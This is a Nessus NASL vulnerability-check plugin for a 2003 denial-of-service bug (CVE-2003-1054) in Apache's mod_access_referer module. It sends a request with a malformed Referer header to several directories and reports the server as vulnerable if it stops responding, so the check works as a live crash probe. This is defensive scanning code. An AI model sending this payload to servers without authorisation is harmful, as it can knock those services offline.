#
# This script was written by Xue Yong Zhi (xueyong@udel.edu)
# 

# Changes by Tenable:
# - Revised plugin title, added OSVDB ref, changed family, formatted desc/solution (6/24/09)

# Ref:
# Date: Wed, 16 Apr 2003 23:14:33 +0200
# From: zillion <zillion@safemode.org>
# To: vulnwatch@vulnwatch.org
# Subject: [VulnWatch] Apache mod_access_referer denial of service issue


exit(0); # Temporarily disabled

include("compat.inc");

if(description)
{
 script_id(11543); 
 script_version("$Revision: 1.24 $");
 script_cve_id("CVE-2003-1054");
 script_bugtraq_id(7375);
 script_osvdb_id(13737);

 script_name(english:"mod_access_referer 1.0.2 for Apache Malformed Referer DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is using a module that is affected by a 
denial of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote web server may be using a mod_access_referer apache module
which contains a NULL pointer dereference bug. Abuse of this 
vulnerability could allow an attacker to launch a denial of service 
attack against affected systems." );
 script_set_attribute(attribute:"see_also", value:"http://lists.grok.org.uk/pipermail/full-disclosure/2003-April/004555.html" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/04/18");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/04/16");
 script_cvs_date("$Date: 2012/03/23 17:57:11 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Apache module mod_access_referer 1.0.2 contains a NULL pointer dereference vulnerability");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2003-2012 Xue Yong Zhi");
 script_family(english:"Web Servers");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/apache");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

b = get_http_banner(port: port);
l = egrep(string: b, pattern: "^Server: Apache");
if (! l) exit(0);
if ("Apache/" >< l && ! ereg(string: l, pattern: "Apache/(1\.3|2\.0)"))
  exit(0);

function check(req)
{
  local_var idx, r, soc;
  #As you see, the Referer part is malformed.
  #And it depends on configuration too -- there must be an IP
  #addresses based access list for mod_access_referer.

  soc = http_open_socket(port);
  if(!soc)exit(0);

  req = http_get(item:req, port:port);
  idx = stridx(req, string("\r\n\r\n"));
  req = insstr(req, string("\r\nReferer: ://www.nessus.org\r\n\r\n"), idx);
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  if ( "HTTP">< r ) return(0);
  
  security_warning(port);
  exit(0);
}

# first to make sure it's a working webserver

req = http_get(item:"/", port:port);
idx = stridx(req, string("\r\n\r\n"));
req = insstr(req, string("\r\nReferer: http://www.nessus.org\r\n\r\n"), idx);
r = http_keepalive_send_recv(port:port, data:req);
if(r==NULL) exit(0);
if("HTTP">!<r) exit(0);

# We do not know which dir is under control of the
# mod_access_reeferer, just try some...

dirs = get_kb_item(string("www/", port, "/content/directories"));
if(isnull(dirs))dirs = make_list("/");

foreach dir (make_list(cgi_dirs(),"/", dirs))
{
 if(dir && check(req:dir)) exit(0);
}
